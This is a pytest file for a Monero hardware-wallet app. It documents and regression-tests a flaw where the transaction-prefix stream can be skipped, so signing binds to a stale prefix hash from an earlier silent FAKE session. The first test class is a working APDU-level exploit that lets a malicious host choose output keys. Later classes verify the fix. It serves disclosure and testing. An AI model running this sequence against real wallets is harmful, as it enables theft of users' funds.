"""
The tx prefix never has to be streamed, so prefixH is not bound to the signed tx.

Who gets paid is decided by the one-time output keys in the prefix vout. Two checks
are meant to enforce that: INS_PREFIX_HASH/P1=2 re-walks vin/vout/extra and compares
the streamed keys against the derived ones (monero_prefix_outkeys_parse plus the
prefix_outkeys_done gate, src/monero_prefix.c:686-703), and the terminal
INS_VALIDATE/P1=3 memcmps the host's `message` against prefixH before folding it into
the signed hash (src/monero_prehash.c:374).

Neither is required. P1=2 is optional: monero_dispatch() releases
INS_GEN_COMMITMENT_MASK as soon as tx_state_ins == INS_PREFIX_HASH
(src/monero_dispatch.c:342-345), which P1=1 alone sets, so a host can go P1=1 -> MASK
-> BLIND -> VALIDATE -> MLSAG without streaming a byte -- and every check above lives
in the P1=2 last-chunk branch. prefixH is then whatever the previous transaction left
behind: only P1=2 writes it (src/monero_prefix.c:705) and monero_reset_tx() doesn't
clear it, and a silent FAKE session can set it to keccak(anything).

So the device signs keccak(message || H || proof) for a `message` it never derived or
verified for this transaction, while the review showed the victim's real destination.
Same amounts, same commitments, attacker-chosen output keys.

DEBUG=1 defines BYPASS_COMMITMENT_FOR_TESTS (Makefile:88), which compiles out the
prefixH memcmp, so "the stale value was accepted" proves nothing on this build. That
is also why the skippable P1=2 is the real defect: even enforced, the memcmp compares
against a value never tied to the current tx.

The fix is a per-transaction prefix_finalized flag, set only on the last P1=2 chunk
after the output-key check and keccak_final_H, cleared by prefix_hash_init and
monero_reset_tx(), and required to leave INS_PREFIX_HASH for
INS_GEN_COMMITMENT_MASK.

Classes, in file order:
  TestPrefixStreamNeverRequiredVuln  the original exploit; skipped, since it now
                                     fails. Use --run-skipped against a build
                                     without the flag to re-confirm it.
  TestPrefixHCheckNotEnforcedInDebugBuild
                                     scope marker: the prefixH memcmp is compiled
                                     out here, so no DEBUG=1 test can validate it.
  TestMultiChunkPrefixAccepted       a prefix split across two P1=2 chunks must
                                     still finalize and release the next command.
                                     Also the only multi-chunk coverage in the
                                     suite; everything else sends one APDU.
  TestPrefixStreamRequiredEnforced   no P1=2 at all must be refused with 0x691F.
  TestPartialPrefixStreamRejected    a P1=2 stream left unterminated must be
                                     refused too, pinning the flag to the last
                                     chunk rather than any chunk.
                                     Both refusals exit the app, so these go last.

test_vuln_outkey_substitution.py and test_vuln_prefix_extra.py check that the P1=2
binding works when it runs; this file covers it being skipped.
test_vuln_stale_mlsagh.py covers the sibling defect on mlsagH.

Run: pytest tests/test_vuln_stale_prefixh.py -v --device flex   (DEBUG=1 build;
protocol V3 means INS_MLSAG, CLSAG would need V4).

Snapshot dirs are named after the bare test function, so method names must stay
unique across the whole suite.
"""

import struct

import pytest
from Crypto.Hash import keccak

from ragger.backend.interface import BackendInterface
from ragger.error import ExceptionRAPDU
from ragger.navigator import Navigator

from monero_client.monero_types import SigType, Keys, Type, InsType
from monero_client.monero_cmd import MoneroCmd, PROTOCOL_VERSION
from monero_client.monero_crypto_cmd import MoneroCryptoCmd
from monero_client.crypto.hmac import hmac_sha256
from monero_client.utils.tx_prefix import build_tx_prefix_outkeys
from monero_client.utils.varint import encode_varint

# ed25519 group order; monero_reduce() is a little-endian mod-l reduce.
L = 2 ** 252 + 27742317777372353535851937790883648493

# Raised by the terminal finalize when message != prefixH -- compiled out on DEBUG=1.
SW_SECURITY_PREFIX_HASH = 0x691B
# Raised once the prefix has not been streamed and verified for this transaction.
SW_SECURITY_PREFIX_NOT_FINALIZED = 0x691F

ZERO_COMMITMENT = bytes(32)
# Any well-formed scalar: the FAKE session's INS_BLIND only needs a valid mask.
DUMMY_MASK = (1).to_bytes(32, "little")
# Attacker-chosen prefix body, streamed in FAKE mode where nothing checks it.
ATTACKER_PREFIX = b"\xde" * 96
# Range-proof slot of the terminal P1=3; unchecked, so any 32 bytes will do.
ATTACKER_PROOF = b"\xad" * 32
# A message that is not, and never was, any prefixH the device computed.
BOGUS_MESSAGE = b"\xbb" * 32

FEE = 30660000  # 0.00003066 XMR


def _raw_apdu(ins: InsType, p1: int, p2: int, option: int, payload: bytes = b"") -> bytes:
    """Full APDU in the app's framing (option is the first data byte)."""
    return struct.pack("BBBBBB", PROTOCOL_VERSION, ins.value, p1, p2,
                       1 + len(payload), option) + payload


def _output_payload(recv: Keys, ak: bytes, blinded_mask: bytes,
                    blinded_amount: bytes, is_change: bool) -> bytes:
    """An INS_VALIDATE output record, as an honest host streams per destination."""
    return b"".join((
        b"\x00", b"\x01" if is_change else b"\x00",
        recv.public_view_key, recv.public_spend_key, ak,
        hmac_sha256(ak, MoneroCryptoCmd.HMAC_KEY, Type.AMOUNT_KEY),
        ZERO_COMMITMENT, blinded_mask, blinded_amount,
    ))


def _sc_reduce(value: bytes) -> bytes:
    """monero_reduce(): little-endian scalar mod l."""
    return (int.from_bytes(value, "little") % L).to_bytes(32, "little")


def _expect_accepted(backend: BackendInterface, apdu: bytes, step: str) -> bytes:
    """Send `apdu`, return its data. Ragger raises on non-9000; turn that into a
    failure message that says what the refusal means."""
    try:
        return backend.exchange_raw(apdu).data
    except ExceptionRAPDU as exc:
        pytest.fail(f"{step} was refused with {exc.status:#06x} -- the device no "
                    "longer signs without a verified prefix stream, so this does "
                    "not reproduce (is this a fixed build?)")


def _expected_mlsagh(short_amounts, message: bytes, proof: bytes) -> bytes:
    """Recompute the pre-MLSAG hash off-device. The REAL-mode keccak_H stream is
    fully host-visible: P1=1 does keccak_init_H then absorbs [type][fee varint], each
    P1=2 absorbs blinded_amount[:8] (is_short set), and the terminal P1=3 finalizes it
    into mlsagH = keccak(message || H || proof). A real host would also stream outPk
    commitments as MORE-set P1=3 steps, appending 32 bytes each."""
    inner = keccak.new(digest_bits=256)
    inner.update(b"\x00" + encode_varint(FEE))
    for v in short_amounts:
        inner.update(v[:8])
    return keccak.new(digest_bits=256,
                      data=message + inner.digest() + proof).digest()


@pytest.mark.skip(reason="Demonstrates the (now-fixed) skippable prefix stream; passes "
                         "only on a build without the prefix_finalized gate. Use "
                         "--run-skipped to re-confirm the exploit.")
@pytest.mark.incremental
class TestPrefixStreamNeverRequiredVuln:
    """A REAL tx signed with no prefix streamed, bound to a prefixH left over from an
    earlier silent FAKE session."""

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        # 2 outputs, churn to self: destination (reviewed) + 0-amount change.
        return {
            "sender": None,
            "receiver_number": 2,
            "receiver": [None, None],
            "is_change_addr": [False, True],
            "amount": [907880000, 0],
            "tx_pub_key": None,
            "_tx_priv_key": None,
            "_ak_amount": [[], []],
            "blinded_amount": [[], []],
            "blinded_mask": [[], []],
            "y": [[], []],
            "stale_prefixh": None,
            "mlsagh": None,
        }

    @staticmethod
    def test_reset(monero: MoneroCmd):
        monero.reset_and_get_version(monero_client_version=b"0.18")

    @staticmethod
    def test_get_keys(monero: MoneroCmd, state):
        public_view_key, public_spend_key, base58_address = monero.get_public_keys()
        sender = Keys(public_view_key=public_view_key,
                      public_spend_key=public_spend_key,
                      secret_view_key=None, secret_spend_key=None,
                      addr=base58_address)
        state["sender"] = sender
        state["receiver"][0] = sender  # churn to self
        state["receiver"][1] = sender

    # ----------------------------------- step 1: prime prefixH in FAKE mode
    @staticmethod
    def test_fake_session_primes_prefixh(monero: MoneroCmd, device,
                                         test_name: str, state):
        """FAKE mode hashes whatever we stream into prefixH, with no vout/extra binding
        and nothing on screen. CLOSE_TX won't clear it."""
        assert monero.set_signature_mode(sig_type=SigType.FAKE) == SigType.FAKE
        tx_pub_key, tx_priv_key, _, _ = monero.open_tx()

        for index in range(state["receiver_number"]):
            monero.gen_txout_keys(
                _tx_priv_key=tx_priv_key, tx_pub_key=tx_pub_key,
                dst_pub_view_key=state["receiver"][index].public_view_key,
                dst_pub_spend_key=state["receiver"][index].public_spend_key,
                output_index=index, is_change_addr=state["is_change_addr"][index],
                is_subaddress=False)

        monero.prefix_hash_init(test_name + "_fake", device, navigator=None,
                                version=0, timelock=0)
        prefix_h = monero.prefix_hash_update(index=1, payload=ATTACKER_PREFIX,
                                             is_last=True)
        assert prefix_h == keccak.new(
            digest_bits=256,
            data=encode_varint(0) + encode_varint(0) + ATTACKER_PREFIX).digest(), \
            "FAKE mode did not hash our prefix bytes verbatim"

        state["stale_prefixh"] = prefix_h
        print(f"\n[prime] FAKE-session prefixH = {prefix_h.hex()}")

        monero.close_tx()  # monero_reset_tx() runs and does NOT touch prefixH

    # ------------------- step 2: an honest REAL tx with NO prefix streamed
    @staticmethod
    def test_real_session_skips_prefix_stream(monero: MoneroCmd, backend: BackendInterface,
                                              device, test_name: str, state):
        """The core of it: P1=1 then straight to INS_GEN_COMMITMENT_MASK. With no P1=2,
        monero_prefix_outkeys_parse() and the prefix_outkeys_done gate never run and
        prefixH is never rewritten."""
        assert monero.set_signature_mode(sig_type=SigType.REAL) == SigType.REAL
        tx_pub_key, tx_priv_key, _, _ = monero.open_tx()
        state["tx_pub_key"] = tx_pub_key
        state["_tx_priv_key"] = tx_priv_key

        # Victim's real (A, B): the OUTK chain, and the review, are honest.
        for index in range(state["receiver_number"]):
            ak, _, _ = monero.gen_txout_keys(
                _tx_priv_key=tx_priv_key, tx_pub_key=tx_pub_key,
                dst_pub_view_key=state["receiver"][index].public_view_key,
                dst_pub_spend_key=state["receiver"][index].public_spend_key,
                output_index=index, is_change_addr=state["is_change_addr"][index],
                is_subaddress=False)
            state["_ak_amount"][index].append(ak)

        # P1=1 alone sets tx_state_ins = INS_PREFIX_HASH, which is all
        # INS_GEN_COMMITMENT_MASK requires.
        monero.prefix_hash_init(test_name, device, navigator=None,
                                version=0, timelock=0)

        # No prefix_hash_update() anywhere. Masks first, then blinds -- a mask after
        # the first INS_BLIND is refused (dispatch.c:342).
        for index in range(state["receiver_number"]):
            state["y"][index].append(
                monero.gen_commitment_mask(state["_ak_amount"][index][0]))
        for index in range(state["receiver_number"]):
            blinded_mask, blinded_amount = monero.blind(
                _ak_amount=state["_ak_amount"][index][0],
                mask=state["y"][index][0], amount=state["amount"][index],
                is_short=True)
            state["blinded_mask"][index].append(blinded_mask)
            state["blinded_amount"][index].append(blinded_amount)

    @staticmethod
    def test_review_approved_without_prefix_stream(monero: MoneroCmd,
                                                   backend: BackendInterface,
                                                   navigator: Navigator, test_name, state):
        """A real review of the victim's own address, confirmed by the user, so
        user_approved_tx becomes 1 and the terminal finalize's gate passes.

        Keep this name unique: snapshot dirs are named after the bare function, so two
        files sharing a method name would overwrite each other's goldens."""
        monero.validate_prehash_init(test_name, backend.device, navigator, 1, 0, FEE)
        # Fee + Output0(amount+address) + Output1(change amount) = 4 screens -> 3 swipes.
        for index in range(state["receiver_number"]):
            monero.validate_prehash_update(
                backend, test_name, navigator, index=index + 1, is_short=True,
                is_change_addr=state["is_change_addr"][index], is_subaddress=False,
                dst_pub_view_key=state["receiver"][index].public_view_key,
                dst_pub_spend_key=state["receiver"][index].public_spend_key,
                _ak_amount=state["_ak_amount"][index][0], commitment=ZERO_COMMITMENT,
                blinded_amount=state["blinded_amount"][index][0],
                blinded_mask=state["blinded_mask"][index][0],
                is_last=index == (state["receiver_number"] - 1),
                swipe_count=3)

    # ----------------------------------------------------- step 3: the proof
    @staticmethod
    def test_terminal_finalize_binds_to_stale_prefixh(backend: BackendInterface, state):
        """Terminal P1=3 with message := the FAKE session's prefixH. Recomputing the
        returned mlsagH off-device shows the signed hash is bound to those 32
        attacker-chosen bytes and to no prefix this session saw.

        Raw APDU: validate_prehash_finalize() sends a whole output record, whose first
        32 bytes would land in `message` by accident."""
        stale = state["stale_prefixh"]
        mlsagh = _expect_accepted(
            backend,
            _raw_apdu(InsType.INS_VALIDATE, 3, 1, 0x00, stale + ATTACKER_PROOF),
            "the terminal INS_VALIDATE P1=3 with a stale prefixH")
        assert len(mlsagh) == 32

        expected = _expected_mlsagh(
            [state["blinded_amount"][i][0] for i in range(state["receiver_number"])],
            message=stale, proof=ATTACKER_PROOF)
        assert mlsagh == expected, (
            "mlsagH is not keccak(stale prefixH || H || proof): got "
            f"{mlsagh.hex()}, expected {expected.hex()}")

        state["mlsagh"] = mlsagh
        print(f"\n[bound] mlsagH = keccak(stale prefixH || H || proof) = {mlsagh.hex()}")

    @staticmethod
    def test_mlsag_signing_proceeds(backend: BackendInterface, state):
        """Signing takes the normal authorized path; no state-machine trick needed.
        The challenge derives from the hash built on the stale prefix."""
        _expect_accepted(backend, _raw_apdu(InsType.INS_MLSAG, 1, 0, 0x00),
                         "INS_MLSAG P1=1 (prepare)")
        c = _expect_accepted(backend, _raw_apdu(InsType.INS_MLSAG, 2, 1, 0x00),
                             "INS_MLSAG P1=2 (hash)")
        assert c == _sc_reduce(keccak.new(digest_bits=256,
                                          data=state["mlsagh"]).digest())
        print("\n[confirmed] signed with no prefix ever streamed: the output-key "
              "binding never ran, and the signed hash is built on the FAKE-session "
              f"prefixH {state['stale_prefixh'].hex()}, so the on-chain output keys are "
              "unconstrained by anything the device checked.")

    @staticmethod
    def test_close_tx(monero: MoneroCmd):
        monero.close_tx()


@pytest.mark.incremental
class TestPrefixHCheckNotEnforcedInDebugBuild:
    """Scope marker, not a vulnerability claim.

    The terminal memcmp(message, prefixH) (src/monero_prehash.c:374) sits behind
    #ifndef BYPASS_COMMITMENT_FOR_TESTS, which DEBUG=1 defines. A FAKE session (no UI,
    no snapshots) streams a prefix, then finalizes with a message matching no prefixH
    the device computed -- and it is accepted. So this suite cannot validate that
    memcmp, and the class above deliberately proves its case structurally instead.

    Without BYPASS_COMMITMENT_FOR_TESTS this test skips on 0x691B, which is the correct
    behaviour; it asserts nothing about the app's security either way."""

    @staticmethod
    def test_bogus_message_is_accepted(monero: MoneroCmd, backend: BackendInterface,
                                       device, test_name: str):
        monero.reset_and_get_version(monero_client_version=b"0.18")
        view, spend, addr = monero.get_public_keys()
        recv = Keys(public_view_key=view, public_spend_key=spend,
                    secret_view_key=None, secret_spend_key=None, addr=addr)

        assert monero.set_signature_mode(sig_type=SigType.FAKE) == SigType.FAKE
        tx_pub_key, tx_priv_key, _, _ = monero.open_tx()
        ak, _, _ = monero.gen_txout_keys(
            _tx_priv_key=tx_priv_key, tx_pub_key=tx_pub_key,
            dst_pub_view_key=view, dst_pub_spend_key=spend,
            output_index=0, is_change_addr=False, is_subaddress=False)

        monero.prefix_hash_init(test_name, device, navigator=None,
                                version=0, timelock=0)
        prefix_h = monero.prefix_hash_update(index=1, payload=ATTACKER_PREFIX,
                                             is_last=True)
        assert prefix_h != BOGUS_MESSAGE  # sanity: the mismatch is real

        blinded_mask, blinded_amount = monero.blind(
            _ak_amount=ak, mask=DUMMY_MASK, amount=1, is_short=True)
        backend.exchange_raw(_raw_apdu(InsType.INS_VALIDATE, 1, 1, 0x00,
                                       b"\x00" + encode_varint(1)))
        backend.exchange_raw(_raw_apdu(InsType.INS_VALIDATE, 2, 1, 0x00,
                                       _output_payload(recv, ak, blinded_mask,
                                                       blinded_amount, is_change=False)))

        try:
            data = backend.exchange_raw(
                _raw_apdu(InsType.INS_VALIDATE, 3, 1, 0x00,
                          BOGUS_MESSAGE + ATTACKER_PROOF)).data
        except ExceptionRAPDU as exc:
            if exc.status == SW_SECURITY_PREFIX_HASH:
                pytest.skip("prefixH memcmp IS enforced in this build (no "
                            "BYPASS_COMMITMENT_FOR_TESTS) -- nothing to record")
            raise

        assert len(data) == 32
        print(f"\n[scope] message {BOGUS_MESSAGE.hex()} matched no prefixH "
              f"({prefix_h.hex()}) yet was accepted: BYPASS_COMMITMENT_FOR_TESTS "
              "compiles out the memcmp, so no DEBUG=1 test can validate it.")

        monero.close_tx()


def _open_real_tx_with_prefix(monero: MoneroCmd, state):
    """reset -> REAL -> open_tx -> gen_txout_keys, and return the serialized prefix
    the device expects for those outputs."""
    monero.reset_and_get_version(monero_client_version=b"0.18")
    view, spend, addr = monero.get_public_keys()
    sender = Keys(public_view_key=view, public_spend_key=spend,
                  secret_view_key=None, secret_spend_key=None, addr=addr)
    state["receiver"] = [sender, sender]  # churn to self

    assert monero.set_signature_mode(sig_type=SigType.REAL) == SigType.REAL
    tx_pub_key, tx_priv_key, _, _ = monero.open_tx()
    state["tx_pub_key"] = tx_pub_key

    for index in range(state["receiver_number"]):
        ak, eph, _ = monero.gen_txout_keys(
            _tx_priv_key=tx_priv_key, tx_pub_key=tx_pub_key,
            dst_pub_view_key=view, dst_pub_spend_key=spend,
            output_index=index, is_change_addr=state["is_change_addr"][index],
            is_subaddress=False)
        state["_ak_amount"][index].append(ak)
        state["eph_keys"].append(eph)

    return build_tx_prefix_outkeys(vout_keys=state["eph_keys"], tx_pubkey=tx_pub_key)


@pytest.mark.incremental
class TestMultiChunkPrefixAccepted:
    """A prefix split across two P1=2 chunks must still finalize, so the flag has to
    be set on the last chunk and not on the first.

    This is also the only multi-chunk prefix coverage in the suite -- every other
    test sends the whole prefix in one APDU. A failure of the prefixH assertion
    below therefore points at the resumable parser, not at the flag."""

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return {"receiver_number": 2, "is_change_addr": [False, True],
                "receiver": None, "tx_pub_key": None, "eph_keys": [],
                "_ak_amount": [[], []]}

    @staticmethod
    def test_chunked_prefix_finalizes(monero: MoneroCmd, device, test_name: str, state):
        prefix = _open_real_tx_with_prefix(monero, state)
        split = len(prefix) // 2

        monero.prefix_hash_init(test_name, device, navigator=None,
                                version=0, timelock=0)
        assert monero.prefix_hash_update(index=1, payload=prefix[:split],
                                         is_last=False) == b""
        prefix_h = monero.prefix_hash_update(index=2, payload=prefix[split:],
                                             is_last=True)
        assert prefix_h == keccak.new(
            digest_bits=256,
            data=encode_varint(0) + encode_varint(0) + prefix).digest(), \
            "chunked stream did not reassemble to the same prefixH"

    @staticmethod
    def test_chunked_prefix_releases_next_command(monero: MoneroCmd, state):
        """Reaching INS_GEN_COMMITMENT_MASK proves prefix_finalized was set."""
        for index in range(state["receiver_number"]):
            monero.gen_commitment_mask(state["_ak_amount"][index][0])

    @staticmethod
    def test_chunked_close(monero: MoneroCmd):
        monero.close_tx()


@pytest.mark.incremental
class TestPrefixStreamRequiredEnforced:
    """Fix verification: with no P1=2 at all, the command that used to let the flow
    continue towards signing is refused.

    The refusal lands before the stale prefixH could ever be reached, and it exits
    the app (monero_main.c:76), so nothing follows it in this class."""

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return {"receiver_number": 2, "is_change_addr": [False, True],
                "receiver": None, "tx_pub_key": None, "eph_keys": [],
                "_ak_amount": [[], []]}

    @staticmethod
    def test_no_stream_setup(monero: MoneroCmd, device, test_name: str, state):
        """P1=1 only -- exactly the sequence the exploit used."""
        _open_real_tx_with_prefix(monero, state)
        monero.prefix_hash_init(test_name, device, navigator=None,
                                version=0, timelock=0)

    @staticmethod
    def test_no_stream_mask_refused(monero: MoneroCmd, state):
        with pytest.raises(ExceptionRAPDU) as exc:
            monero.gen_commitment_mask(state["_ak_amount"][0][0])
        assert exc.value.status == SW_SECURITY_PREFIX_NOT_FINALIZED, (
            f"expected {SW_SECURITY_PREFIX_NOT_FINALIZED:#06x} with no prefix "
            f"streamed, got {exc.value.status:#06x}")


@pytest.mark.incremental
class TestPartialPrefixStreamRejected:
    """A P1=2 stream that is never terminated must be refused as well, so the flag
    tracks the last chunk rather than any chunk."""

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return {"receiver_number": 2, "is_change_addr": [False, True],
                "receiver": None, "tx_pub_key": None, "eph_keys": [],
                "_ak_amount": [[], []]}

    @staticmethod
    def test_partial_stream_setup(monero: MoneroCmd, device, test_name: str, state):
        """Send the first half of the prefix with MORE still set, then stop."""
        prefix = _open_real_tx_with_prefix(monero, state)
        monero.prefix_hash_init(test_name, device, navigator=None,
                                version=0, timelock=0)
        assert monero.prefix_hash_update(index=1, payload=prefix[:len(prefix) // 2],
                                         is_last=False) == b""

    @staticmethod
    def test_partial_stream_mask_refused(monero: MoneroCmd, state):
        with pytest.raises(ExceptionRAPDU) as exc:
            monero.gen_commitment_mask(state["_ak_amount"][0][0])
        assert exc.value.status == SW_SECURITY_PREFIX_NOT_FINALIZED, (
            f"expected {SW_SECURITY_PREFIX_NOT_FINALIZED:#06x} for an unterminated "
            f"prefix stream, got {exc.value.status:#06x}")
